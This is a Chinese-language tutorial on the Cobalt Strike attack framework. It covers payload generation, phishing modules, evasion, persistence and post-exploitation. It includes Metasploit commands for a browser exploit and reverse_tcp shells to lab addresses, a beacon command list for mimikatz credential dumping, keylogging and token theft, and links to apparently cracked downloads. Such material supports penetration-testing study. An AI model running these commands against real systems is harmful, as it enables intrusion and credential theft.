Cobalt Strike使用详解
=================

1、简介
----

Cobalt Strike是一款渗透测试神器，Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，主要是为了方便一个渗透团队内部能够及时共享所有成员的渗透信息,加强成员间的交流协作,提高渗透效率,可被团队进行分布式协团操作。Cobalt Strike是一款以metasploit为基础的GUI的框框架式渗透工具，Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。

2、环境部署
------

开启服务端 ./teamserver+服务器ip地址+密码  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-85d6cd2c7e4aa2ee56306b00f49018b6177373fe.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-85d6cd2c7e4aa2ee56306b00f49018b6177373fe.png)  
客户端连接，双击start.bat,用户任意，输入上述密码  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2d48ff98818848af8edb90bf8b2c6eba35ce0b24.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2d48ff98818848af8edb90bf8b2c6eba35ce0b24.png)

3、Cobalt Strike选项卡
------------------

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-91094a0d38bf3e28c0da49c7092152b255358ade.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-91094a0d38bf3e28c0da49c7092152b255358ade.png)  
**New Connection 新建连接**  
**Preferences 设置**  
**Visualization 可视化显示，有三种**  
**VPN interfaces VPN接口**  
**Listeners 设置监听：**  
CobaltStrike的内置监听器为Beacon，外置监听器为Foreign。CobaltStrike的Beacon支持异步通信和交互式通信。监听器载荷详情如下：

```php
windows/dns/reverse_dns_txt:使用DNS的TXT类型进行数据传输，对目标进行管理
windows/dns/reverse_http:使用DNS的方式对目标主机进行管理
windows/http/reverse_http:使用HTTP的方式对目标主机进行管理
windows/https/reverse_https:使用HTTPS加密的方式对目标主机进行管理
windows/smb/bind_pipe: 使用SMB命名管道通信
windows/foreign/reverse_http: 将目标权限通过http的方式外派给metasploit或empire
windows/foreign/reverse_https: 将目标权限通过https的方式外派给metasploit或empire
windows/foreign/reverse_tcp: 将目标权限通过tcp的方式外派给metasploit或empire
```

**script Manager为脚本管理器**  
相当于我们的军火库，想要攻击得越猛，当然弹药得越充足，加载的插件越多，功能就越多，是非常重要的一个模块，下面这篇文章已经将加载的插件写得非常详细，请参考：<https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg>

4、view选项卡
---------

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d2149719f0450e5c40ebb9ac82001e47ed271d2d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d2149719f0450e5c40ebb9ac82001e47ed271d2d.png)

```php
分别为：
Applications -> 获取浏览器版本信息
Credentials -> 凭证当通过hashdump或者Mimikatz抓取过的密码都会储存在这里。
Downloads -> 下载文件
Event Log -> 主机上线记录以及团队协作聊天记录
Keystrokes -> 进行键盘记录
Proxy Pivots -> 代理模块
Screenshots -> 进程截图
Script Console -> 控制台 
Targets -> 显示目标
Web Log -> Web访问记录
```

5、Attacks选项卡
------------

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b81cf976dd5568632f301c467d65284f0aa38ddb.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b81cf976dd5568632f301c467d65284f0aa38ddb.png)

### Packages模块

**HTML Application 生成恶意的HTA木马文件进行攻击**  
请参考：[https://blog.csdn.net/qq\_39101049/article/details/99704424](https://blog.csdn.net/qq_39101049/article/details/99704424)  
**MS Office Macro 生成基于office病毒的payload模块**  
请参考：<https://www.cnblogs.com/Cl0ud/p/13824021.html>  
**Payload Generator 生成各种语言版本的payload**  
该模块可以生成语言的后门Payload包括：C,C#,COM Scriptlet,java,Peri,Powershell,Powershell Command,Python，Raw,Ruby,免杀框架Veli中的shellcode,VBA个人感觉这是CS的一个很大的迷人之处。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8d846a0be1ce8f8187546d11e2c35cb276d97017.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8d846a0be1ce8f8187546d11e2c35cb276d97017.png)  
**Windows Dropper捆绑器，能够对文档进行捆绑并执行payload**  
这个是一个windows程序的捆绑器，他可以实现把后门捆绑于其他程序之上，比如扫雷游戏，某些带有诱惑性的可执行文件，这种攻击方式结合社工来一同应用往往会发挥奇效，请参考：  
<https://www.jianshu.com/p/71907549d877>  
**Windows Executable**  
生成32位或64位的exe和基于服务的exe、dll等后门程序。在32的Windows操作系统中无法执行64位的payload，而且对于后渗透测试的相关模块，使用32位和64位的payload会产生不同的影响，使用时要谨慎选择  
请参考：[https://blog.csdn.net/m0\_53087192/article/details/112531384](https://blog.csdn.net/m0_53087192/article/details/112531384)  
**Windows Executable(S)**  
用于生成一个windows可执行文件，其中包含beacon的完整payload，不需要阶段行的请求。与windows Executable模块相比，该模块额外提供了代理设置，以便在较为苛刻的的环境中进行渗透测试。该模块还支持Powershell脚本，用于Stageless Payload注入内存。

### Web Drive-by钓鱼模块

网络钓鱼是结合社会工程学攻击方式之一，主要是通过对受害者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱进行诸如欺骗、伤害等危害手段！钓鱼攻击在我们渗透也是常用的手段，而在cobalt strike中的网络钓鱼的功能点非常多，我们需要熟练掌握，请大家参考：  
[https://blog.csdn.net/qq\_34801745/article/details/111274699](https://blog.csdn.net/qq_34801745/article/details/111274699)

### Spare Phish 邮件钓鱼

请大家参考：  
<https://cloud.tencent.com/developer/article/1041508>

6、Reporting选项卡
--------------

Reporting模块可以配合cobaltstrike的操作记录、结果等，直接生成相关报告  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4a71161a1157e431ee913b05f536a1ef1652f12b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4a71161a1157e431ee913b05f536a1ef1652f12b.png)

7、会话管理
------

### cobalt strike派生metasploit会话

msf设置监听载荷

```php
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.134
set lport 8800
exploit -j
```

新建外部监听器主机ip地址为产生msf会话的主机  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2044769ce8c481afa886ca5f0c3623abe2b4409b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2044769ce8c481afa886ca5f0c3623abe2b4409b.png)  
选择监听器，因为metasploit用的tcp 所以这时协议也使用用tcp  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7e568d7b89bd62c4627972de05996c75e1e9b054.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7e568d7b89bd62c4627972de05996c75e1e9b054.png)  
执行过后就会msf里面产生会话  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7ceb5dbb98b5f2938d4d10fb52f4d37f9cf65089.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7ceb5dbb98b5f2938d4d10fb52f4d37f9cf65089.png)

### metasploit session 派生会话给cobalt strike

首先在攻击主机上产生msf会话,由于这里主机不够，所以teamserver既是服务器，也是攻击主机  
产生msf会话

```php
use exploit/windows/browser/ms14_064_ole_code_execution
set srvhost 192.168.0.128
set SRVPORT 80
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.128
set lport 12345
exploit 
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f0db8409acaf71689937d275afc62bc540be4a56.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f0db8409acaf71689937d275afc62bc540be4a56.png)  
在teamserver服务器上派生会话给cs

```php
use exploit/windows/local/payload_inject
set session 1 此时的会话应该与前面的对应
set payload windows/meterpreter/reverse_http
set lhsot 192.168.0.128 
set lport 8888
set DisablePayloadHandler true
exploit -j
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fa5eb49b6d0bc59699d48bd92f96e2629ec26f5e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fa5eb49b6d0bc59699d48bd92f96e2629ec26f5e.png)  
成功派生会话，设置监听器时要注意端口与teamserver设置的一样  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-79a74894f5bf8a7919b5d50d90d1182daf26d1bb.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-79a74894f5bf8a7919b5d50d90d1182daf26d1bb.png)

8、Cobalt Strike的免杀
------------------

由于现在对安全越来越重视，很多产商对各种有攻击性的代码与工具进行了查杀，刚刚使用cobaltstrike生成的payload，很有可能被查杀，免杀技术在我们进行渗透过程中是必不可少的，如果一上传到别人服务器上就给杀了，那不是一件很尴尬的事嘛。我这个菜鸡还不怎么会做免杀，而且在攻防社区已经有一位大佬连续写了几篇免杀文章，请大家参考：  
<https://forum.butian.net/share/366>  
<https://forum.butian.net/share/368>  
<https://forum.butian.net/share/369>  
<https://forum.butian.net/share/370>  
<https://forum.butian.net/share/371>  
<https://forum.butian.net/share/372>

9、Cobalt Strike使用重定器与DNS beacon的原理分析
------------------------------------

**使用重定器的原因主要有：**  
1.保护服务器地址，并作为攻击者，它也是一个很好的安全操作。  
2.给予了一些很好的适应能力，假如你们的工具中有一两个堵塞了没有大不了的，也可以进行通信。  
**使用DNS beacon 的原因：**  
dns木马因为隐蔽性好，在受害者不会开放任何端口 可以规避防火墙协议，走的是53端口 (服务器)，防火墙不会拦截，缺点响应慢。  
在这一篇文章我已经对这两个做了详细的介绍请大家参考：<https://forum.butian.net/share/380>

10、cobaltstrike可持续后门的使用
-----------------------

为了能够持续的控制目标主机，往往我们都会去制作持续后门  
请参考：[https://www.sohu.com/a/334705180\_354899](https://www.sohu.com/a/334705180_354899)

11、Cobalt Strike malleable C2的使用
--------------------------------

可以通过修改c2配置文件，更改beacon中 payload的属性、行为、通过框架修改这些配置文件的属性，伪造正常的通信的流量，实现一些ids 入侵检测防火墙的绕过。现在成熟的ids检测工具 都可以检测出Cobalt Strike 这些著名得商业渗透测试工具。在一些很严格的环境中，被检测出来基本上就很难继续深入进行渗透。  
请参考：[https://blog.csdn.net/weixin\_43804472/article/details/84754786](https://blog.csdn.net/weixin_43804472/article/details/84754786)

12、ssh隧道在beacon的应用
------------------

请参考：<https://www.linuxlz.com/aqst/1843.html>

13、msf和cobalt strike实现联动
------------------------

msf与cobalt strike两者各有所长，msf和cobalt strik联动是为了把两者的优点尽可能的灵活结合起来进行运用,让各自相互依托,去做自己最擅长的事情，这样就可以非常完美的进行结合，更好的渗透。请参考：  
<http://cn-sec.com/archives/68898.html>

14、后渗透测试模块
----------

cobaltstrike的后渗透测试模块可以协助渗透测试人员进行信息收集、权限提升、端口扫描、端口转发、横向移动等操作。在cobaltstrike中，后渗透测试命令可以在beacon命令行环境中执行，其中的大部分对应的图形化操作。

### 使用elevate模块提升beacon的权限

选中beacon，点击右键，在弹出的快捷菜单中选择“Access”----&gt;“Elevate”选项，或者在beacon命令环境中执行“elevate\[exploit\]\[listener\]”命令，打开提权模块，其中红色框框内的为自带模块，而其他为我扩充的模块。ms14-058模块用于将Windows主机从普通用户权限直接提升至system权限。uac-dll和uac-token-duplication模块用于协助渗透测试人员进行bypassUAC操作。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-87491367599a495abc17384a5c65e3a2304a97f8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-87491367599a495abc17384a5c65e3a2304a97f8.png)  
请参考：<https://blog.csdn.net/limb0/article/details/103351253>

### 通过cobaltstrike利用Golden Ticket提升域管理权限

在制作前，需要在域控上执行命令导出 krbtgt，并且获取域的sid,单击右键，在弹出的快捷菜单中选择“Access”----&gt;“Golden [![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dc5f231228b8eff571f5a324de81b37e8103851d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dc5f231228b8eff571f5a324de81b37e8103851d.png)

### socks server模块

选中一台目标主机，单击右键，在弹出的快捷菜单中选择“pivoting”------&gt;“socks server”选项，或者在beacon命令行环境中执行“socks \[stop|port\]”命令调用socks server模块。选择讴歌socks server，如图所示，输入自定义的端口号，然后单击“Launch”按钮，一个通向目标内网的socks代理就搭建好了。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-428d9815dcd5f47a3424c1c8b689477725995fd1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-428d9815dcd5f47a3424c1c8b689477725995fd1.png)  
socks代理有三种使用方法。第一种方法是，直接通过浏览器添加一个socks4代理（服务器地址为团队服务器地址，端口就是刚刚自定义的端口）。第二种方法，选中界面中选中一个socks代理，单击“Tunnel”按钮，将生成的代码复制到msf控制台中，将msf中的流量引入此socks代理。第三种方法是，在Windows中使用SocksCap64等工具添加代理，在Linux中使用proxychains等工具进行操作。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e2ff6cd62d1611fbb2f32af4ed97baac8bb9028c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e2ff6cd62d1611fbb2f32af4ed97baac8bb9028c.png)

### Spawn As模块派生指定用户身份的shell

选中一个beacon，单击右键，在弹出的快捷菜单中选择“Access”-----&gt;“Spawn As”选项，或者在beacon命令环境中执行“spawnas \[domain\\user\]\[password\]\[listener\]”命令，调用spawnas模块，该模块是通过rundll32.exe完成工作的。如果已知用户账户密码，就可以指定用户的身份，将指定身份权限的beacon派发给其他Cobalt Strike团队服务器、Metasploit、Empire。如果不指定域环境，用“.”来代替用于指定域环境的参数。

### 级联监听器模块

选中目标主机，点击右键，在弹出的快捷菜单中选择“Privoting”---&gt;“Listener”调用级联监听器模块。这个模块本质上是端口转发模块和监听器模块的组合，可以转发纯内网机器（必须能往访问当前被控机器）的beacon。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d78e2f25e4ed304297b52330243ccc2b8b5792c8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d78e2f25e4ed304297b52330243ccc2b8b5792c8.png)

### spawn模块派发shell

为了防止权限丢失，在获取一个beacon之后，可以使用spawn模块再次派发一个beacon。  
选择一个beacon，点击右键，在弹出的快捷菜单中选择“Spawn”选项，或者在beacon模块行环境中执行“spawn\[Lister\]”命令，调用spawn模块。选择一个监听器，在下一次心跳时就可以获得一个心得beacon，spawn模块可以与msf、Empire等框架联动。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-131340ccf1675d24f637b232a0f79f95a2346d83.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-131340ccf1675d24f637b232a0f79f95a2346d83.png)

### mimikatz模块

在cobaltstrike中，mimikatz模块没有图形化界面。在beacon命令行环境中执行如下命令，调用mimikatz模块。

```php
mimikatz [module::command] <args>
mimikatz [!module::command] <args>
mimikatz [@module::command] <args>
```

beacon内置了mimikatz模块，beacon会自动匹配目标主机的架构，载入对应版本的mimikatz，单击红色框框内的按钮，切换到“Target Table”界面，可以看到以及发现的且目前没有权限的主机。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5ce9834ad5cb54cf05888951438484453c88fd99.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5ce9834ad5cb54cf05888951438484453c88fd99.png)

### 文件管理模块

支持上传文件、创建文件夹、刷新等操作  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-46378c915a82459bbd3f67296adc1cfb892a43f4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-46378c915a82459bbd3f67296adc1cfb892a43f4.png)

### 进程列表模块

进程列表模块支持键盘记录、进程注入、截图、令牌伪造等操作。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8f397c46a666a2cdb51e2570f93462bc24812210.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8f397c46a666a2cdb51e2570f93462bc24812210.png)

### 端口扫描模块

单击右键，在弹出的快捷菜单中选择“Explore”---&gt;“Port Scan”选项。在端口扫描界面中不能自定义扫描范围，但在beacon命令行环境中可以自定义扫描范围。端口扫描界面支持两种扫描方式，选择“arp”选项，就是使用ARP协议来探测目标是否存活，选择“icmp”选项就是使用ARP协议来探测目标是否存活。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e7b03af30e63ec30b2d0f60be4ca28d745f44927.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e7b03af30e63ec30b2d0f60be4ca28d745f44927.png)

### 与目标主机进行交互操作

单击右键，在弹出的快捷菜单中选中需要操作的beacon，然后单击“Interact”选项，进入主机交互模式。在执行命令时，需要在命令前添加“shell”，即可调用目标系统中的cmd.exe，常用于内网信息收集。  
判断是否有域控，查看主机的IP地址。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-535254c2565163655e09f64a819af341c91ffbb0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-535254c2565163655e09f64a819af341c91ffbb0.png)  
列出域内主机列表  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6bc99c1cdc09522a2efe6978bd43b4e34f4ea627.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6bc99c1cdc09522a2efe6978bd43b4e34f4ea627.png)  
shell命令非常多这里就不一一列举出来请参考：<https://forum.butian.net/share/236>  
beacon中常用命令解释如下：

```php
Command                   Description
-------                   -----------
argue                     进程参数欺骗
blockdlls                 阻止子进程加载非Microsoft DLL
browserpivot              注入受害者浏览器进程
bypassuac                 绕过UAC提升权限
cancel                    取消正在进行的下载
cd                        切换目录
checkin                   强制让被控端回连一次
clear                     清除beacon内部的任务队列
connect                   Connect to a Beacon peer over TCP
covertvpn                 部署Covert VPN客户端
cp                        复制文件
dcsync                    从DC中提取密码哈希
desktop                   远程桌面(VNC)
dllinject                 反射DLL注入进程
dllload                   使用LoadLibrary将DLL加载到进程中
download                  下载文件
downloads                 列出正在进行的文件下载
drives                    列出目标盘符
elevate                   使用exp
execute                   在目标上执行程序(无输出)
execute-assembly          在目标上内存中执行本地.NET程序
exit                      终止beacon会话
getprivs                  Enable system privileges on current token
getsystem                 尝试获取SYSTEM权限
getuid                    获取用户ID
hashdump                  转储密码哈希值
help                      帮助
inject                    在注入进程生成会话
jobkill                   结束一个后台任务
jobs                      列出后台任务
kerberos_ccache_use       从ccache文件中导入票据应用于此会话
kerberos_ticket_purge     清除当前会话的票据
kerberos_ticket_use       Apply 从ticket文件中导入票据应用于此会话
keylogger                 键盘记录
kill                      结束进程
link                      Connect to a Beacon peer over a named pipe
logonpasswords            使用mimikatz转储凭据和哈希值
ls                        列出文件
make_token                创建令牌以传递凭据
mimikatz                  运行mimikatz
mkdir                     创建一个目录
mode dns                  使用DNS A作为通信通道(仅限DNS beacon)
mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)
mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)
mode http                 使用HTTP作为通信通道
mv                        移动文件
net                       net命令
note                      备注       
portscan                  进行端口扫描
powerpick                 通过Unmanaged PowerShell执行命令
powershell                通过powershell.exe执行命令
powershell-import         导入powershell脚本
ppid                      Set parent PID for spawned post-ex jobs
ps                        显示进程列表
psexec                    Use a service to spawn a session on a host
psexec_psh                Use PowerShell to spawn a session on a host
psinject                  在特定进程中执行PowerShell命令
pth                       使用Mimikatz进行传递哈希
pwd                       当前目录位置
reg                       Query the registry
rev2self                  恢复原始令牌
rm                        删除文件或文件夹
rportfwd                  端口转发
run                       在目标上执行程序(返回输出)
runas                     以其他用户权限执行程序
runasadmin                在高权限下执行程序
runu                      Execute a program under another PID
screenshot                屏幕截图
setenv                    设置环境变量
shell                     执行cmd命令
shinject                  将shellcode注入进程
shspawn                   启动一个进程并将shellcode注入其中
sleep                     设置睡眠延迟时间
socks                     启动SOCKS4代理
socks stop                停止SOCKS4
spawn                     Spawn a session 
spawnas                   Spawn a session as another user
spawnto                   Set executable to spawn processes into
spawnu                    Spawn a session under another PID
ssh                       使用ssh连接远程主机
ssh-key                   使用密钥连接远程主机
steal_token               从进程中窃取令牌
timestomp                 将一个文件的时间戳应用到另一个文件
unlink                    Disconnect from parent Beacon
upload                    上传文件
wdigest                   使用mimikatz转储明文凭据
winrm                     使用WinRM横向渗透
wmi                       使用WMI横向渗透
```

最后再通过一篇别人写的使用cobaltstrike渗透内网就可以大致掌握cobaltstrike的内容了  
<https://www.freebuf.com/vuls/244095.html>  
cobalt strike4.0下载：  
中文版链接：<https://pan.baidu.com/s/1FL9DqNlJoAW4R9OKwPglMw>  
提取码：qf0k  
英文版链接：[https://pan.baidu.com/s/1dz\_aAq3bIVLZDYb3kl66hQ](https://pan.baidu.com/s/1dz_aAq3bIVLZDYb3kl66hQ)  
提取码：d0op  
英文版有很多不认识的单词，可以对比中文版进行快速学习